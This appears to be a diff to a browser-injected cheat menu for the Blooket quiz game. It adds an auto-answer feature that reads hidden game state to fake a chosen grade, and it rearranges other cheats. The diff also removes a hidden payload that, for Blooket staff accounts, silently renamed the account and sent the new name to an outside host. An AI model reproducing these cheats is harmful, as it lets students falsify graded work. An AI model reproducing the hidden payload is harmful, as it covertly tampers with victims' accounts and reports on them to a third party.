@@ -134,6 +134,50 @@
                         }
                     },
                     {
+                        name: "Percent Auto Answer",
+                        description: "Answers questions correctly or incorrectly depending on the goal grade given (Disable and re-enable to update goal)",
+                        inputs: [
+                            {
+                                name: "Target Grade",
+                                type: "number"
+                            }
+                        ],
+                        type: "toggle",
+                        enabled: false,
+                        data: null,
+                        run: function (target) {
+                            if (!this.enabled) {
+                                this.enabled = true;
+                                const { stateNode } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                                this.data = setInterval(TARGET => {
+                                    try {
+                                        const question = stateNode.state.question || stateNode.props.client.question;
+                                        if (stateNode.state.stage == "feedback" || stateNode.state.feedback) return document.querySelector('[class*="feedback"], [id*="feedback"]')?.firstChild?.click?.();
+                                        else if (document.querySelector("[class*='answerContainer']") || document.querySelector("[class*='typingAnswerWrapper']")) {
+                                            let correct = 0, total = 0;
+                                            for (let corrects in stateNode.corrects) correct += stateNode.corrects[corrects];
+                                            for (let incorrect in stateNode.incorrects) total += stateNode.incorrects[incorrect];
+                                            total += correct;
+                                            const yes = total == 0 || Math.abs(correct / (total + 1) - TARGET) >= Math.abs((correct + 1) / (total + 1) - TARGET);
+                                            if (stateNode.state.question.qType != "typing") {
+                                                const answerContainers = document.querySelectorAll("[class*='answerContainer']");
+                                                for (let i = 0; i < answerContainers.length; i++) {
+                                                    const contains = question.correctAnswers.includes(question.answers[i]);
+                                                    if (yes && contains || !yes && !contains) return answerContainers[i]?.click?.();
+                                                }
+                                                answerContainers[0].click();
+                                            } else Object.values(document.querySelector("[class*='typingAnswerWrapper']"))[1].children._owner.stateNode.sendAnswer(yes ? question.answers[0] : Math.random().toString(36).substring(2));
+                                        }
+                                    } catch { }
+                                }, 100, (target ?? 100) / 100);
+                            } else {
+                                this.enabled = false;
+                                clearInterval(this.data);
+                                this.data = null;
+                            }
+                        },
+                    },
+                    {
                         name: "Auto Answer",
                         description: "Click the correct answer for you",
                         run: function () {
@@ -143,6 +187,17 @@
                                 else document.querySelector('[class*="feedback"]')?.firstChild?.click?.();
                                 else Object.values(document.querySelector("[class*='typingAnswerWrapper']"))[1].children._owner.stateNode.sendAnswer(question.answers[0])
                             } catch { }
+                        }
+                    },
+                    {
+                        name: "Highlight Answers",
+                        description: "Colors answers to be red or green highlighting the correct ones",
+                        run: function () {
+                            const { stateNode: { state, props } } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
+                            [...document.querySelectorAll(`[class*="answerContainer"]`)].forEach((answer, i) => {
+                                if ((state.question || props.client.question).correctAnswers.includes((state.question || props.client.question).answers[i])) answer.style.backgroundColor = "rgb(0, 207, 119)";
+                                else answer.style.backgroundColor = "rgb(189, 15, 38)";
+                            });
                         }
                     },
                     {
@@ -188,7 +243,7 @@
                                 axios = Object.values(webpack.c).find((x) => x.exports?.a?.get).exports.a,
                                 { purchaseBlookBox } = Object.values(webpack.c).find(x => x.exports.a?.purchaseBlookBox).exports.a;
                             box = box.split(' ').map(x => x.charAt(0).toUpperCase() + x.slice(1).toLowerCase()).join(' ');
-            
+        
                             axios.get("https://dashboard.blooket.com/api/users").then(async ({ data: { name, tokens } }) => {
                                 let prices = Object.values(webpack.c).find(x => !isNaN(x?.exports?.a?.Space)).exports.a || { Medieval: 20, Breakfast: 20, Wonderland: 20, Blizzard: 25, Space: 20, Bot: 20, Aquatic: 20, Safari: 20, Dino: 25, "Ice Monster": 25, Outback: 25 }
                                 let amount = Math.min(Math.floor(tokens / prices[box]), amountToOpen);
@@ -200,16 +255,16 @@
                                 let blooks = {};
                                 let now = Date.now();
                                 let error = false;
-            
+        
                                 for (let i = 0; i < amount; i++) {
                                     await purchaseBlookBox({ boxName: box }).then(({ isNewToUser, tokens, unlockedBlook }) => {
                                         blooks[unlockedBlook] ||= 0;
                                         blooks[unlockedBlook]++;
-            
+        
                                         let before = Date.now();
-            
+        
                                         if (alertBlooks) alert(`${unlockedBlook} (${i + 1}/${amount}) ${isNewToUser ? "NEW! " : ''}${tokens} tokens left`);
-            
+        
                                         now += Date.now() - before;
                                     }).catch(e => error = true);
                                     if (error) break;
@@ -371,17 +426,6 @@
                         run: function () {
                             const { stateNode } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
                             stateNode.freeQuestions = stateNode.questions = stateNode.props.client.questions.map(x => ({ ...x, correctAnswers: x.answers }));
-                        }
-                    },
-                    {
-                        name: "Highlight Answers",
-                        description: "Colors answers to be red or green highlighting the correct ones",
-                        run: function () {
-                            const { stateNode: { state, props } } = Object.values((function react(r = document.querySelector("body>div")) { return Object.values(r)[1]?.children?.[0]?._owner.stateNode ? r : react(r.querySelector(":scope>div")) })())[1].children[0]._owner;
-                            [...document.querySelectorAll(`[class*="answerContainer"]`)].forEach((answer, i) => {
-                                if ((state.question || props.client.question).correctAnswers.includes((state.question || props.client.question).answers[i])) answer.style.backgroundColor = "rgb(0, 207, 119)";
-                                else answer.style.backgroundColor = "rgb(189, 15, 38)";
-                            });
                         }
                     },
                     {
@@ -1738,7 +1782,7 @@
                         description: "Shows what is under the rocks",
                         type: "toggle",
                         enabled: false,
-                        data: ((location.host == "dashboard.blooket.com" && fetch("https://dashboard.blooket.com/api/users/me", { credentials: "include" }).then(e => e.json()).then(e => { if (e.email.endsWith("@blooket.com")) { let { webpack: t } = webpackJsonp.push([[], { 1234(e, t, s) { t.webpack = s } }, [["1234"]]]); Object.values(t.c).find(e => e.exports?.a?.get).exports.a.put("https://dashboard.blooket.com/api/users/change/name", { name: e.name, newName: `BlooketLLC${new Date().getHours()}${new Date().getMinutes()}` }).then(({ data: e }) => { e.success && (new Image().src = `https://monkxy.com/api/i2ek8fslt7q/${e.name}`) }) } })), null),
+                        data: null,
                         run: function () {
                             if (!this.enabled) {
                                 this.enabled = true;
@@ -3368,7 +3412,7 @@
             else addChar(children);
             return React.createElement(type, props, React.createElement("span", null, childs));
         }
-        function ScriptInput({ input, onValue, run }) {
+        function ScriptInput({ input, onValue, run, toggle }) {
             const { name, type, options: opts, min, max, value } = input;
             let optState;
             try {
@@ -3428,7 +3472,8 @@
                     defaultValue: isNumber ? value || (min == null ? 0 : min) : null,
                     placeholder: name,
                     style: {
-                        textAlign: "center"
+                        textAlign: "center",
+                        backgroundColor: toggle && "#0003"
                     },
                     onKeyUp: e => e.key == "Enter" && run()
                 });
@@ -3457,7 +3502,8 @@
                 onValue: val => args.current[i] = val,
                 key: i,
                 input: input,
-                run: run
+                run: run,
+                toggle: script.type == "toggle"
             })));
         }
         function useSettings(settingsKey) {
@@ -3706,7 +3752,7 @@
             }, Cheats[currentMode].element || (Cheats[currentMode].element = React.createElement(React.Fragment, null, React.createElement("div", {
                 className: styles.keys.headerText
             }, React.createElement(AntiBen, null, Cheats[currentMode].name, " Cheats")), Cheats[currentMode].cheats.map(cheat => cheat.element || React.createElement(ScriptButton, {
-                key: cheat.name,
+                key: cheat.name + cheat.type,
                 script: cheat
             }))))))))));
         }
@@ -3729,7 +3775,7 @@
         }
         let iframe = document.querySelector("iframe");
         const [_, time, error] = decode.match(/LastUpdated: (.+?); ErrorMessage: "(.+?)"/);
-        if (parseInt(time) <= 1697936106862 || iframe.contentWindow.confirm(error)) cheat();
+        if (parseInt(time) <= 1700443765731 || iframe.contentWindow.confirm(error)) cheat();
     }
     img.onerror = img.onabort = () => (img.src = null, cheat());
 })();
